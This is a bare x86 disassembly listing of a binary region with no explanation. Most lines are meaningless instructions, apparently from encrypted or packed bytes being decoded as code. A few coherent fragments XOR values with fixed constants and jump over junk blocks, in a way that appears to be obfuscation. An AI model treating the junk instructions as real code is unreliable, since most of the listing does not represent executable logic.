  42131b:	leave  
  42131c:	jo     0x421326
  42131e:	aas    
  42131f:	xlat   BYTE PTR ds:[ebx]
  421320:	imul   ebx,edx,0xfffffff7
  421323:	ss (bad) 
  421325:	repnz xor ecx,ecx
  421328:	jmp    0x4212ad
  42132a:	sub    al,0xd4
  42132c:	push   esi
  42132d:	cmp    eax,0xc63104c8
  421332:	xchg   DWORD PTR [ebx+0x3b4e2df9],ebp
  421338:	mov    bh,0x49
  42133a:	jmp    0x8191:0x111a7488
  421341:	push   ebx
  421342:	sti    
  421343:	mov    al,ds:0xa7b55d3
  421348:	adc    eax,0x22976297
  42134d:	add    DWORD PTR [ebx+eax*2+0x1e],ebp
  421351:	rcl    BYTE PTR [ecx],0xa6
  421354:	adc    eax,0xc048f0f1
  421359:	dec    ecx
  42135a:	lock jns 0x421324
  42135d:	rcl    DWORD PTR [ecx],cl
  42135f:	and    bh,BYTE PTR [ebp-0x3261189f]
  421365:	add    DWORD PTR [esi],ebx
  421367:	xchg   ecx,eax
  421368:	iret   
  421369:	stos   BYTE PTR es:[edi],al
  42136a:	dec    edi
  42136b:	out    dx,eax
  42136c:	cs sahf 
  42136e:	cmp    DWORD PTR [ecx+edx*2+0x3a],esi
  421372:	fld    QWORD PTR [ebx-0x6a21a0bf]
  421378:	xchg   ebp,eax
  421379:	xor    BYTE PTR [edx+esi*2+0x6a10bce7],ah
  421380:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421381:	out    dx,eax
  421382:	int3   
  421383:	lods   eax,DWORD PTR ds:[esi]
  421384:	pop    ecx
  421385:	cmc    
  421386:	sub    BYTE PTR ds:0xe8d3de51,bl
  42138c:	nop
  42138d:	push   ecx
  42138e:	xchg   BYTE PTR [edx-0x1c54c5c1],dh
  421394:	stos   BYTE PTR es:[edi],al
  421395:	retf   
  421396:	add    esp,ebp
  421398:	cmp    esi,DWORD PTR [ebp+eax*4+0x4e1a3506]
  42139f:	and    al,0xc6
  4213a1:	fwait
  4213a2:	mov    dh,0x7
  4213a4:	hlt    
  4213a5:	xlat   BYTE PTR ds:[ebx]
  4213a6:	fdiv   st(4),st
  4213a8:	stos   DWORD PTR es:[edi],eax
  4213a9:	dec    edx
  4213aa:	loop   0x421407
  4213ac:	dec    ebx
  4213ad:	fnclex 
  4213af:	mov    ecx,0xd713e8ae
  4213b4:	push   ss
  4213b5:	mov    ss,WORD PTR [eax+ecx*2-0x3b]
  4213b9:	nop
  4213ba:	inc    esi
  4213bb:	in     eax,0xf6
  4213bd:	mov    esp,0xe9ab91fb
  4213c2:	mov    gs,ecx
  4213c4:	jge    0x421435
  4213c6:	cmp    al,0x15
  4213c8:	rol    BYTE PTR [esi-0x289d4cb3],1
  4213ce:	add    al,dh
  4213d0:	psrlq  mm5,QWORD PTR [esi+0x38528613]
  4213d7:	data16 xlat BYTE PTR ds:[ebx]
  4213d9:	fdiv   DWORD PTR [edi]
  4213db:	fsubr  DWORD PTR [edi]
  4213dd:	mov    dl,ah
  4213df:	popf   
  4213e0:	xchg   esi,eax
  4213e1:	cmp    al,0x67
  4213e3:	sahf   
  4213e4:	adc    BYTE PTR [ecx],ch
  4213e6:	aad    0xd4
  4213e8:	add    ebp,edi
  4213ea:	mov    BYTE PTR [edi-0x5b],cl
  4213ed:	mov    ah,0x3a
  4213ef:	or     al,0x3c
  4213f1:	mov    ah,0x9f
  4213f3:	sub    dh,BYTE PTR [edx]
  4213f5:	add    al,0xfd
  4213f7:	pop    es
  4213f8:	push   ecx
  4213f9:	xchg   ebx,eax
  4213fa:	xchg   ecx,eax
  4213fb:	add    eax,0x238212bb
  421400:	jle    0x4213b4
  421402:	hlt    
  421403:	repz sbb esp,ebp
  421406:	aam    0xcb
  421408:	mov    DWORD PTR [ecx-0x26adeb00],eax
  42140e:	or     bh,BYTE PTR fs:[esi+ebp*4-0x30e2b276]
  421416:	jno    0x42147a
  421418:	inc    edx
  421419:	jp     0x4213fe
  42141b:	retf   
  42141c:	sbb    eax,0xef0a8ce0
  421421:	inc    BYTE PTR [ecx+0x2b8ae8f2]
  421427:	pushf  
  421428:	mov    cl,0x3e
  42142a:	call   0x4223f5
  42142f:	or     ebx,eax
  421431:	or     esi,edx
  421433:	movzx  eax,bl
  421436:	push   eax
  421437:	lea    eax,[ebp-0x198]
  42143d:	push   eax
  42143e:	call   0x415a09
  421443:	mov    eax,DWORD PTR [ebp-0x1f0]
  421449:	mov    edx,DWORD PTR [ebp-0x1ec]
  42144f:	xor    eax,0xcb79b576
  421454:	xor    edx,0x9c2b8ae8
  42145a:	mov    cl,0x2
  42145c:	call   0x408bb8
  421461:	mov    esi,eax
  421463:	mov    edi,edx
  421465:	mov    eax,DWORD PTR [ebp-0x1f0]
  42146b:	jmp    0x421852
  421470:	out    0xc8,eax
  421472:	push   esi
  421473:	sub    esi,DWORD PTR [esi-0x44]
  421476:	mov    esp,0xfcb5630c
  42147b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42147c:	popa   
  42147d:	int3   
  42147e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42147f:	nop
  421480:	pop    ds
  421481:	mov    ebx,0xc44abec0
  421486:	mov    esi,0x52c188be
  42148b:	ret    0x77c0
  42148e:	pop    edi
  42148f:	dec    ebx
  421490:	push   esi
  421491:	mov    eax,ds:0x44d0d897
  421496:	push   ebp
  421497:	dec    ecx
  421498:	mov    dh,ch
  42149a:	out    0x7,eax
  42149c:	jle    0x421484
  42149e:	xchg   ebx,eax
  42149f:	imul   BYTE PTR [edx+0x16]
  4214a2:	jb     0x4214b5
  4214a4:	lea    edi,[edx-0xd3fa2e8]
  4214aa:	jbe    0x4214cb
  4214ac:	jp     0x421498
  4214ae:	mov    esi,0x9019bfed
  4214b3:	sbb    edi,DWORD PTR [eax+edi*4+0x1f]
  4214b7:	das    
  4214b8:	jb     0x421470
  4214ba:	pop    ecx
  4214bb:	rcl    ebp,0xa
  4214be:	out    dx,al
  4214bf:	mov    BYTE PTR [edi+0x15],ch
  4214c2:	pushf  
  4214c3:	jmp    0x72641417
  4214c8:	cli    
  4214c9:	pusha  
  4214ca:	clc    
  4214cb:	jge    0x421512
  4214cd:	stos   DWORD PTR es:[edi],eax
  4214ce:	push   edx
  4214cf:	into   
  4214d0:	in     al,0xbe
  4214d2:	loop   0x421489
  4214d4:	outs   dx,BYTE PTR ds:[esi]
  4214d5:	add    esp,DWORD PTR [ecx+0x62bd3b6c]
  4214db:	xchg   ebp,eax
  4214dc:	ror    BYTE PTR [edi+0x16],cl
  4214df:	xor    eax,DWORD PTR ds:0x858db7c9
  4214e5:	out    dx,al
  4214e6:	push   eax
  4214e7:	and    BYTE PTR [ebx-0x35],ah
  4214ea:	push   0xe309832d
  4214ef:	lock scas eax,DWORD PTR es:[edi]
  4214f1:	aad    0x49
  4214f3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4214f4:	adc    ch,BYTE PTR [edi]
  4214f6:	add    eax,0x21ea41c3
  4214fb:	xchg   edx,eax
  4214fc:	add    BYTE PTR [ebp+ebp*4-0x45782ee1],cl
  421503:	(bad)  
  421504:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421505:	mov    WORD PTR [ebp-0x4fd47e2c],?
  42150b:	repnz mov al,ds:0xef314665
  421511:	mov    WORD PTR [ebp+0x3f7db1e],es
  421517:	sbb    edx,DWORD PTR [edi+eiz*1+0x7cfc2dfb]
  42151e:	inc    ebp
  42151f:	aam    0x5a
  421521:	lea    esp,[edi+0x1a]
  421524:	nop
  421525:	xor    esp,ecx
  421527:	dec    ebx
  421528:	mov    BYTE PTR [ebx],bh
  42152a:	and    BYTE PTR [ebx],al
  42152c:	sub    al,0xac
  42152e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42152f:	mov    al,ds:0x3c09dc3b
  421534:	sar    DWORD PTR [ecx+0x2007047d],0x70
  42153b:	mov    dl,0x37
  42153d:	push   esi
  42153e:	sahf   
  42153f:	out    0x85,eax
  421541:	sbb    ch,BYTE PTR [edi]
  421543:	clc    
  421544:	retf   0xc5a7
  421547:	inc    edi
  421548:	inc    esi
  421549:	div    DWORD PTR [edx-0xa]
  42154c:	ret    
  42154d:	out    0xac,eax
  42154f:	push   esi
  421550:	es stos DWORD PTR es:[edi],eax
  421552:	jge    0x421511
  421554:	int3   
  421555:	pop    esi
  421556:	push   esp
  421557:	retf   
  421558:	xor    al,0x6c
  42155a:	xchg   esi,eax
  42155b:	mov    eax,ds:0x3204d76b
  421560:	mov    DWORD PTR [esi-0x10],edx
  421563:	mov    bh,0x56
  421565:	jl     0x421503
  421567:	pop    esi
  421568:	sub    edx,edi
  42156a:	mov    ah,0xd4
  42156c:	inc    edx
  42156d:	addr16 stc 
  42156f:	jae    0x42159a
  421571:	dec    esi
  421572:	cld    
  421573:	ds cwde 
  421575:	cmp    ah,BYTE PTR [edx+edx*1+0x6f]
  421579:	ins    DWORD PTR es:[edi],dx
  42157a:	leave  
  42157b:	test   eax,0xa0f80ba0
  421580:	pop    edx
  421581:	fisttp WORD PTR [ecx]
  421583:	jae    0x4215f4
  421585:	outs   dx,DWORD PTR ds:[esi]
  421586:	imul   eax,edi,0xffffffbf
  421589:	inc    ebp
  42158a:	inc    ecx
  42158b:	xchg   ebx,eax
  42158c:	aaa    
  42158d:	mov    edi,0x6f1789f0
  421592:	dec    esp
  421593:	into   
  421594:	int3   
  421595:	adc    BYTE PTR [esi-0x3c6f8020],ah
  42159b:	imul   di,bx,0x74
  42159f:	xor    bl,dh
  4215a1:	jae    0x42156d
  4215a3:	cmp    ebp,edx
  4215a5:	mov    ds,ebx
  4215a7:	add    BYTE PTR [edx],ch
  4215a9:	jp     0x4215b0
  4215ab:	gs inc edx
  4215ad:	daa    
  4215ae:	mov    dl,0x75
  4215b0:	push   cs
  4215b1:	test   cl,al
  4215b3:	lock xor edx,DWORD PTR [esi-0x4411708a]
  4215ba:	push   cs
  4215bb:	inc    esi
  4215bc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4215bd:	pop    edi
  4215be:	rcr    DWORD PTR [eax],0x5d
  4215c1:	pop    edi
  4215c2:	jns    0x4215cd
  4215c4:	les    edi,FWORD PTR [eax]
  4215c6:	in     al,0x9d
  4215c8:	ds dec ebp
  4215ca:	sub    eax,0xbb83d13b
  4215cf:	pop    eax
  4215d0:	pop    ss
  4215d1:	xor    dh,BYTE PTR [edi-0x3e]
  4215d4:	lods   eax,DWORD PTR ds:[esi]
  4215d5:	sub    esi,DWORD PTR [esp+esi*4]
  4215d8:	lock xor bl,BYTE PTR [ecx+0x4c]
  4215dc:	pushf  
  4215dd:	adc    al,0x0
  4215df:	lods   eax,DWORD PTR ds:[esi]
  4215e0:	push   0x7b
  4215e2:	add    dl,BYTE PTR [esi-0x1e]
  4215e5:	stc    
  4215e6:	lods   al,BYTE PTR ds:[esi]
  4215e7:	jb     0x4215ff
  4215e9:	js     0x4215c1
  4215eb:	loop   0x42158f
  4215ed:	mov    al,0x21
  4215ef:	shl    DWORD PTR [ecx+edx*2+0x61],1
  4215f3:	or     al,0xe4
  4215f5:	cmc    
  4215f6:	ins    DWORD PTR es:[edi],dx
  4215f7:	nop
  4215f8:	pop    ss
  4215f9:	dec    eax
  4215fa:	jb     0x4215b6
  4215fc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4215fd:	mov    ch,0xb2
  4215ff:	shl    ah,1
  421601:	adc    ebp,edi
  421603:	mov    esi,0xfd4566ba
  421608:	adc    edi,ebx
  42160a:	fwait
  42160b:	sbb    BYTE PTR [edi-0x16],ah
  42160e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42160f:	not    bh
  421611:	imul   ecx,DWORD PTR [edi-0x39604a66],0x19
  421618:	pop    ds
  421619:	inc    ebx
  42161a:	repz pop esi
  42161c:	and    edi,DWORD PTR [esi]
  42161e:	pop    ds
  42161f:	test   al,0x77
  421621:	imul   esp,DWORD PTR [edi],0xffffffec
  421624:	and    al,0x39
  421626:	imul   ebx,DWORD PTR [eax],0x34770d38
  42162c:	cli    
  42162d:	test   BYTE PTR ss:[ebx],al
  421630:	jmp    0x42166e
  421632:	das    
  421633:	jmp    0x1803:0x91e7c2e7
  42163a:	xchg   esp,eax
  42163b:	and    eax,0xe1501af2
  421640:	mov    eax,0x40d5340c
  421645:	xchg   ebx,eax
  421646:	xlat   BYTE PTR ds:[ebx]
  421647:	(bad)  
  421648:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421649:	inc    esi
  42164a:	in     eax,0x3e
  42164c:	mov    ah,cl
  42164e:	scas   eax,DWORD PTR es:[edi]
  42164f:	shl    DWORD PTR [ecx+0x1],1
  421652:	pop    edi
  421653:	add    eax,0x8fa05c98
  421658:	leave  
  421659:	push   ss
  42165a:	or     ah,BYTE PTR [edx+0xf45b869]
  421660:	adc    al,0x2b
  421662:	shl    DWORD PTR [ecx],1
  421664:	push   esp
  421665:	mov    edx,0xc6a327f3
  42166a:	mov    ah,0x63
  42166c:	loopne 0x42164c
  42166e:	call   0x1572:0x4be0a356
  421675:	lock dec eax
  421677:	jnp    0x4216a5
  421679:	push   ss
  42167a:	iret   
  42167b:	xchg   edi,eax
  42167c:	jae    0x4216c3
  42167e:	xor    BYTE PTR [eax+eiz*1+0x4bd59cfd],ah
  421685:	sub    bh,0x7e
  421688:	push   ebx
  421689:	adc    dh,BYTE PTR [ecx+edi*1+0x30]
  42168d:	shl    DWORD PTR [esi+0x7c],1
  421690:	mov    al,ds:0xb78621b0
  421695:	sbb    DWORD PTR [ecx-0x5e],ebx
  421698:	lods   eax,DWORD PTR ds:[esi]
  421699:	ret    
  42169a:	push   0x3a
  42169c:	pop    esp
  42169d:	jae    0x421644
  42169f:	std    
  4216a0:	and    eax,0x48b34fc4
  4216a5:	or     BYTE PTR ds:0x6d85ade2,0xc8
  4216ac:	sbb    al,0x1c
  4216ae:	jg     0x4216da
  4216b0:	xor    eax,0xd79faae9
  4216b5:	in     al,dx
  4216b6:	sbb    ecx,edx
  4216b8:	retf   0x988
  4216bb:	(bad)  [ebp+0x1a]
  4216be:	adc    edx,DWORD PTR [eax+edi*8-0xa]
  4216c2:	int3   
  4216c3:	neg    DWORD PTR [ebx]
  4216c5:	ret    
  4216c6:	cmp    BYTE PTR [esi+0x4b],0xbc
  4216ca:	mov    dl,0xed
  4216cc:	in     eax,0x73
  4216ce:	dec    esi
  4216cf:	or     al,0xa
  4216d1:	aas    
  4216d2:	cmp    BYTE PTR [esi],0x22
  4216d5:	sub    DWORD PTR [edi],esp
  4216d7:	in     eax,dx
  4216d8:	xlat   BYTE PTR ds:[ebx]
  4216d9:	mov    ch,0x2c
  4216db:	in     eax,dx
  4216dc:	lahf   
  4216dd:	stos   DWORD PTR es:[edi],eax
  4216de:	stc    
  4216df:	jmp    0x4216c0
  4216e1:	mov    ds:0xb45f1692,al
  4216e6:	mov    eax,ecx
  4216e8:	mov    ds:0x6d6a70c9,al
  4216ed:	retf   
  4216ee:	mov    ah,0xdb
  4216f0:	(bad)  
  4216f1:	or     eax,0xfcb2b183
  4216f6:	xchg   ecx,eax
  4216f7:	pop    esi
  4216f8:	test   eax,0xe6db212d
  4216fd:	mov    dh,0x65
  4216ff:	mul    BYTE PTR [ebx-0x55217f31]
  421705:	push   0xfffffff1
  421707:	mov    ds:0xed24ad59,al
  42170c:	(bad)  
  42170d:	icebp  
  42170e:	sub    eax,0x59cb338d
  421713:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421714:	stos   DWORD PTR es:[edi],eax
  421715:	mov    ecx,0xe1cc5155
  42171a:	(bad)  
  42171b:	(bad)  
  42171c:	xor    DWORD PTR [ebx],eax
  42171e:	shl    dl,1
  421720:	lea    ecx,[edi]
  421722:	adc    ah,BYTE PTR [ebx-0x427c2fed]
  421728:	xchg   edx,eax
  421729:	push   es
  42172a:	out    dx,eax
  42172b:	dec    edi
  42172c:	pop    edi
  42172d:	popa   
  42172e:	ss inc ebp
  421730:	std    
  421731:	lods   eax,DWORD PTR ds:[esi]
  421732:	sahf   
  421733:	xchg   DWORD PTR [edi+0x2b],esi
  421736:	test   DWORD PTR [eax],esi
  421738:	mov    dh,0x7e
  42173a:	into   
  42173b:	sbb    al,0xc8
  42173d:	in     eax,0x75
  42173f:	sar    DWORD PTR [ebp-0x17a118bb],0x9a
  421746:	or     al,0x70
  421748:	inc    ecx
  421749:	in     al,0x90
  42174b:	into   
  42174c:	aam    0x6a
  42174e:	lds    ecx,FWORD PTR [edx+eax*1]
  421751:	inc    eax
  421752:	pop    ds
  421753:	pop    es
  421754:	dec    ebp
  421755:	fcomp  st(2)
  421757:	pop    eax
  421758:	mov    dh,dh
  42175a:	jg     0x4217a1
  42175c:	mov    al,ds:0x9b2d6e18
  421761:	idiv   DWORD PTR [ecx+0x30]
  421764:	xor    esp,DWORD PTR [esi]
  421766:	and    al,0x60
  421768:	je     0x4216f9
  42176a:	dec    esi
  42176b:	sbb    DWORD PTR ds:[ebx-0x7babb61e],0xffffffa4
  421773:	test   BYTE PTR fs:[edi+0x1e],cl
  421777:	into   
  421778:	mov    eax,ds:0xb240f66c
  42177d:	mov    dh,BYTE PTR [edi+0x4f59cfb4]
  421783:	push   eax
  421784:	aaa    
  421785:	or     al,0x8d
  421787:	or     DWORD PTR ds:0x76921ee9,0x25
  42178e:	xor    DWORD PTR [esi+0x3900ddd3],ebx
  421794:	retf   0x36ce
  421797:	out    0xc2,eax
  421799:	mov    esi,0xc2e67e06
  42179e:	or     ah,0x35
  4217a1:	xor    ecx,edi
  4217a3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4217a4:	push   esi
  4217a5:	sub    eax,0x7794591e
  4217aa:	xchg   DWORD PTR [ebp-0x68e474dd],eax
  4217b0:	cmp    eax,0x6f0b8bb8
  4217b5:	and    ebx,DWORD PTR ds:0x1e90c083
  4217bb:	cmc    
  4217bc:	popf   
  4217bd:	jbe    0x4217da
  4217bf:	adc    eax,0x440937d
  4217c4:	(bad)
  4217c8:	stc    
  4217c9:	inc    esp
  4217ca:	loopne 0x4217df
  4217cc:	or     DWORD PTR [edx*1-0x1ded34a4],0xfffffff6
  4217d4:	mov    eax,DWORD PTR [ecx+ecx*1-0x7aaad95a]
  4217db:	inc    ebx
  4217dc:	call   0x72b87cdb
  4217e1:	sbb    BYTE PTR [edi+0x217da25a],0x8
  4217e8:	fimul  DWORD PTR [ecx+0x39]
  4217eb:	jecxz  0x4217f3
  4217ed:	inc    ecx
  4217ee:	bsr    eax,eax
  4217f1:	pop    ecx
  4217f2:	push   esi
  4217f3:	js     0x421796
  4217f5:	sbb    BYTE PTR [eiz*8+0x3ca47e58],al
  4217fc:	ins    DWORD PTR es:[edi],dx
  4217fd:	xor    al,bl
  4217ff:	in     al,dx
  421800:	inc    ecx
  421801:	retf   
  421802:	xchg   BYTE PTR [ebp+0x4d],ah
  421805:	(bad)  
  421806:	sub    edx,ecx
  421808:	sub    BYTE PTR [edi+0x71],dl
  42180b:	popf   
  42180c:	xchg   BYTE PTR [edx],bh
  42180e:	xchg   ecx,eax
  42180f:	pop    ss
  421810:	xchg   bl,bl
  421812:	add    ah,al
  421814:	test   eax,0xed2b091d
  421819:	push   esp
  42181a:	push   ds
  42181b:	pop    ebp
  42181c:	cdq    
  42181d:	mov    al,0x48
  42181f:	fist   WORD PTR [edi]
  421821:	ds ja  0x42187d
  421824:	inc    ebx
  421825:	cmp    al,BYTE PTR cs:[ecx+esi*4+0x32]
  42182a:	call   0x7acecfc3
  42182f:	dec    edx
  421830:	scas   al,BYTE PTR es:[edi]
  421831:	mov    eax,0xb28d4bd6
  421836:	push   esp
  421837:	out    0x31,al
  421839:	mov    cl,BYTE PTR [eax+0x6b]
  42183c:	pop    esi
  42183d:	(bad)  
  42183e:	fwait
  42183f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421840:	stos   BYTE PTR es:[edi],al
  421841:	or     cl,bh
  421843:	test   DWORD PTR [ebx],0x358f13e
  421849:	add    DWORD PTR [edi+0x33],edi
  42184c:	es mov cl,0xbf
  42184f:	repz pop edi
  421851:	push   ss
  421852:	mov    edx,DWORD PTR [ebp-0x1ec]
  421858:	xor    eax,0xcb79b576
  42185d:	xor    edx,0x9c2b8ae8
  421863:	mov    cl,0x3e
  421865:	call   0x4223f5
  42186a:	or     esi,eax
  42186c:	or     edi,edx
  42186e:	mov    DWORD PTR [ebp-0x1f8],esi
  421874:	jmp    0x421cb0
  421879:	mov    eax,DWORD PTR [ebp-0x1e0]
  42187f:	mov    edx,DWORD PTR [ebp-0x1dc]
  421885:	xor    eax,0xcb79b576
  42188a:	xor    edx,0x9c2b8ae8
  421890:	mov    cl,0x2
  421892:	call   0x408bb8
  421897:	mov    esi,eax
  421899:	mov    edi,edx
  42189b:	mov    eax,DWORD PTR [ebp-0x1e0]
  4218a1:	mov    edx,DWORD PTR [ebp-0x1dc]
  4218a7:	xor    eax,0xcb79b576
  4218ac:	xor    edx,0x9c2b8ae8
  4218b2:	mov    cl,0x3e
  4218b4:	call   0x4223f5
  4218b9:	or     esi,eax
  4218bb:	or     edi,edx
  4218bd:	jmp    0x421ca4
  4218c2:	sbb    bh,BYTE PTR [esi]
  4218c4:	shr    DWORD PTR [edx+0x6ebaba9a],1
  4218ca:	daa    
  4218cb:	xchg   DWORD PTR [eax-0x2f],ebp
  4218ce:	push   ecx
  4218cf:	jb     0x4218ae
  4218d1:	nop
  4218d2:	lods   al,BYTE PTR ds:[esi]
  4218d3:	rol    eax,0xbe
  4218d6:	dec    edx
  4218d7:	les    edi,FWORD PTR [esi+0x47aac7be]
  4218dd:	les    edi,FWORD PTR [ebp+0x2a]
  4218e0:	jle    0x421863
  4218e2:	xchg   DWORD PTR [ebx+0x1ad26e87],eax
  4218e8:	ret    0x144a
  4218eb:	pop    es
  4218ec:	jmp    0x1585:0x963030f5
  4218f3:	inc    edi
  4218f4:	(bad)  [ecx-0x9]
  4218f7:	sub    eax,0xa858f9ba
  4218fc:	hlt    
  4218fd:	mov    al,BYTE PTR [edx-0x59]
  421900:	or     BYTE PTR [ebx+0x10],bh
  421903:	sub    eax,0x7fc2dd8f
  421908:	lock xor eax,0x260559c
  42190e:	in     al,0x73
  421910:	gs imul ch
  421913:	sbb    al,0xf2
  421915:	mov    ch,0x31
  421917:	mov    eax,ds:0xdaa512c
  42191c:	add    DWORD PTR [ebx+0x52c79a6f],eax
  421922:	or     eax,0xb4a8bd48
  421927:	adc    eax,0x20a1a769
  42192c:	fdivp  st(2),st
  42192e:	idiv   dh
  421930:	js     0x4218d1
  421932:	xchg   ebx,eax
  421934:	add    edi,esp
  421936:	jecxz  0x4219a1
  421938:	ret    0x85fe
  42193b:	and    cl,BYTE PTR [eax-0x2761b651]
  421941:	fisubr DWORD PTR [esi-0x37d947aa]
  421947:	aas    
  421948:	test   DWORD PTR [eax],eax
  42194a:	pushf  
  42194b:	outs   dx,BYTE PTR ds:[esi]
  42194c:	xchg   ecx,eax
  42194d:	cmp    ecx,ecx
  42194f:	cmp    eax,0x9da4e642
  421954:	cmp    eax,0x1e35fcc
  421959:	sub    DWORD PTR [esi+0x1f5cfc7f],edx
  42195f:	loopne 0x4219a2
  421961:	mov    eax,ds:0x438bad53
  421966:	fstp   st(0)
  421968:	lock (bad) 
  42196a:	bound  ebx,QWORD PTR [esi]
  42196c:	(bad)  
  42196d:	or     eax,0x6efcba1a
  421972:	retf   0x2a5c
  421975:	push   ebp
  421976:	cmp    eax,0x33d659db
  42197b:	mov    eax,ds:0xef806f1
  421980:	adc    BYTE PTR [eax],ch
  421982:	std    
  421983:	mov    bl,0x99
  421985:	cmp    al,0x9c
  421987:	(bad)  
  421988:	cld    
  421989:	repz fdiv DWORD PTR [eax+0x75]
  42198d:	cs jecxz 0x421938
  421990:	ret    0x8d3b
  421993:	xchg   BYTE PTR [eax+0x74],ch
  421996:	jnp    0x4219a9
  421998:	fld    QWORD PTR [edi+0x35]
  42199b:	xchg   ebp,eax
  42199c:	push   sp
  42199e:	and    BYTE PTR [eax-0x720a144a],ch
  4219a4:	jg     0x42197a
  4219a6:	mov    bh,0xa3
  4219a8:	jp     0x421a0d
  4219aa:	or     edx,DWORD PTR [edx-0x585c0639]
  4219b0:	aas    
  4219b1:	dec    BYTE PTR [eax-0x4f]
  4219b4:	mov    al,0x87
  4219b6:	pop    ecx
  4219b7:	push   ecx
  4219b8:	jno    0x4219b6
  4219ba:	dec    BYTE PTR [edi]
  4219bc:	pushf  
  4219bd:	dec    esi
  4219be:	call   0xc108:0xd11b83ac
  4219c5:	add    eax,DWORD PTR [edi+0x4d]
  4219c8:	pop    es
  4219c9:	(bad)  
  4219ca:	cmp    al,al
  4219cc:	xor    DWORD PTR [edx-0x329396fd],edx
  4219d2:	pusha  
  4219d3:	loop   0x421a31
  4219d5:	xchg   BYTE PTR [ebx-0x7f8d1e5c],bh
  4219db:	data16 int 0xa7
  4219de:	js     0x4219e7
  4219e0:	ret    0xe8e2
  4219e3:	adc    eax,0x4867c601
  4219e8:	repz imul esp,DWORD PTR [ecx+edi*2+0x749e2864],0x67
  4219f1:	out    0x24,eax
  4219f3:	pop    eax
  4219f4:	out    dx,eax
  4219f5:	pop    esp
  4219f6:	adc    edx,DWORD PTR [ebp-0x5a]
  4219f9:	dec    esp
  4219fa:	test   DWORD PTR [ebx],eax
  4219fc:	xor    bl,ah
  4219fe:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4219ff:	fisubr WORD PTR [ebp+0x72]
  421a02:	and    dh,BYTE PTR [edi]
  421a04:	and    eax,0x2473b716
  421a09:	mov    dl,0xe5
  421a0b:	jnp    0x4219a0
  421a0d:	pop    ecx
  421a0e:	pop    edx
  421a0f:	pushf  
  421a10:	stos   DWORD PTR es:[edi],eax
  421a11:	mov    ebx,0x630309ca
  421a16:	xor    DWORD PTR [eax],0x37
  421a19:	xchg   edi,eax
  421a1a:	nop
  421a1b:	jno    0x4219af
  421a1d:	ret    0x8fec
  421a20:	mov    bh,0xbb
  421a22:	outs   dx,DWORD PTR ds:[esi]
  421a23:	les    ecx,FWORD PTR [ecx+edx*2+0x7b]
  421a27:	out    dx,al
  421a28:	dec    eax
  421a29:	adc    BYTE PTR [ebp+0x5],0xef
  421a2d:	fist   WORD PTR [edi-0x30]
  421a30:	mov    al,0x1e
  421a32:	ja     0x421a10
  421a34:	mov    ds:0xadf22a9e,eax
  421a39:	sub    bl,BYTE PTR [esi]
  421a3b:	sub    DWORD PTR [ebx],esp
  421a3d:	adc    esp,DWORD PTR [ecx]
  421a3f:	push   ebp
  421a40:	or     DWORD PTR fs:[eax+0x2dae252d],edx
  421a47:	pop    ebp
  421a48:	stos   DWORD PTR es:[edi],eax
  421a49:	aam    0x7f
  421a4b:	aad    0x47
  421a4d:	jbe    0x421ab3
  421a4f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421a50:	inc    esp
  421a51:	sub    eax,0x2d4e4880
  421a56:	(bad)  
  421a57:	adc    dl,BYTE PTR [edi+0x9]
  421a5a:	inc    ebp
  421a5b:	cmp    BYTE PTR [ecx-0x63],cl
  421a5e:	dec    ebp
  421a5f:	xor    BYTE PTR [esp+edi*8-0x5e16a5bb],bl
  421a66:	in     eax,dx
  421a67:	adc    al,0xc6
  421a69:	or     BYTE PTR [eax],ch
  421a6b:	adc    dh,BYTE PTR [esi+0x279cd316]
  421a71:	push   esi
  421a72:	push   0xffffff9d
  421a74:	jecxz  0x421a93
  421a76:	jns    0x421a76
  421a78:	call   0x4803:0xeb5f8cae
  421a7f:	jo     0x421acf
  421a81:	int    0x4
  421a83:	imul   esi,DWORD PTR [eax+0x6c],0xffffffc2
  421a87:	(bad)  
  421a88:	push   0x5b
  421a8a:	and    DWORD PTR [ebx+0x5e01b747],edx
  421a90:	fdivr  DWORD PTR [ebx]
  421a92:	rcl    esp,0xc8
  421a95:	pop    ebx
  421a96:	mov    esi,0x2d20c96a
  421a9b:	lods   al,BYTE PTR ds:[esi]
  421a9c:	pop    esp
  421a9d:	je     0x421a32
  421a9f:	shl    BYTE PTR [esi-0x1],1
  421aa2:	ret    
  421aa3:	jnp    0x421aa3
  421aa5:	fs mov cl,0xd0
  421aa8:	inc    edi
  421aa9:	mov    WORD PTR [edi],?
  421aab:	mov    BYTE PTR [edi],0x13
  421aae:	pop    ebp
  421aaf:	mov    edi,0xbd7a4c2f
  421ab4:	ss mov dh,BYTE PTR ds:[ecx]
  421ab8:	sub    esi,DWORD PTR [ebx]
  421aba:	adc    BYTE PTR [edx+0x5e00595d],dl
  421ac0:	jnp    0x421b24
  421ac2:	sbb    ebx,ebp
  421ac4:	fldcw  WORD PTR [edx+0x18]
  421ac7:	mov    eax,esp
  421ac9:	adc    BYTE PTR [esi+0x8],0xc4
  421acd:	aaa    
  421ace:	push   ds
  421acf:	pop    ecx
  421ad0:	push   ds
  421ad1:	retf   0x6d24
  421ad4:	fist   WORD PTR [ebp+0x16b9f08e]
  421ada:	or     bl,BYTE PTR [esi]
  421adc:	test   DWORD PTR [esi+edi*8-0x5c5cd7a8],edi
  421ae3:	inc    edx
  421ae4:	mov    ecx,0xf412de8a
  421ae9:	xchg   DWORD PTR [ecx+esi*8],esi
  421aec:	pop    esi
  421aed:	sub    BYTE PTR [ebp+0x595ee41f],bl
  421af3:	call   0x41e9:0x5e9ee47d
  421afa:	dec    esi
  421afb:	loop   0x421b2e
  421afd:	sbb    ebx,DWORD PTR [ebp-0x65]
  421b00:	imul   ebp,edx,0x77aa1577
  421b06:	clc    
  421b07:	clc    
  421b08:	inc    esi
